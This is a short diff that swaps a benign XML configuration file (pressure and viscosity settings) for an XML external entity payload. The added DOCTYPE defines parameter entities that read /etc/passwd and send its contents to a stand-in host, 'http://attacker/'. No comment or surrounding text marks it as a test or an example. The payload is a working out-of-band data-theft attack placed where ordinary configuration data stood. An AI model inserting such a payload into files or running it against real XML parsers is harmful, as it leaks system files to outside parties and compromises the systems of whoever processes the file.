@@ -1,4 +1,6 @@
-<config>
-    <pressure>120</pressure>
-    <viscosity>0.004</viscosity>
-</config>
+<!DOCTYPE data [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker/?x=%file;'>">
+    %eval;
+    %exfiltrate;
+    ]>
